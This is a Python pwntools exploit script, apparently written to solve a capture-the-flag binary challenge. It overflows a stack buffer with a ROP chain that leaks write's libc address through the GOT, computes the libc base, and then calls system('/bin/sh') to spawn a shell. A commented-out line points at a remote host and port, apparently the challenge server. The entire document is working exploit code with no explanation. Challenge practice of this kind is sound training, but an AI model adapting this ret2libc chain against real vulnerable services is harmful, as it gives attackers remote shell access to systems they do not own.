#!/usr/bin/python3
from pwn import *
import sys
context.log_level = 'DEBUG'
context(os='linux', arch='amd64')
e = context.binary = ELF("./pwn")
p = e.debug(gdbscript="source /home/nick/global/halfdisp.py"
+"\nbreak *main+116"
+"\nc"
)
# -----------------------------------------------------START OF SETUP--------------------------------------------------
libc = ELF("./glibc/libc.so.6")
exe = ELF("./pwn")
rop = ROP(exe) # PULLS APART THE PIECES like pop_rdi
p.recvuntil(b"\n")
MaxLen = 256
padding = 72 * "\x90"
#ROPgadget --binary pwn | grep rdi

pop_rsi = rop.find_gadget(["pop rsi"])[0]
pop_rdi = rop.find_gadget(["pop rdi"])[0]
ret = rop.find_gadget(["ret"])[0]
main_function = exe.symbols.main

write_plt = exe.plt.write
write_got = exe.got.write# Time to find GOT AND PLT


# -----------------------------------------------------Payload Setup--------------------------------------------------



payload = flat([
padding,
p64(ret),
p64(pop_rsi),
p64(write_got),
p64(0x90909090),
p64(write_plt),
p64(ret),
p64(main_function)
])
# -----------------------------------------------------Send Payload 1--------------------------------------------------
p.readuntil(b'current status: ')

p.send(payload)
p.read(0x15)
write_libc = u64(p.read(8))
success(f"{hex(write_libc)=}")
libc_base = write_libc-libc.symbols.write
libc.address = libc_base
success(f"{hex(libc.address)=}")

system = libc.symbols.system

binsh = next(libc.search(b"/bin/sh\x00"))
p.recvuntil(b"\n")

payload = flat([
padding,
p64(ret),
p64(pop_rdi),
p64(binsh),
p64(ret),

p64(system),
p64(ret)

])
p.send(payload)
#p = pwn.remote("94.237.53.3",45701)
p.interactive()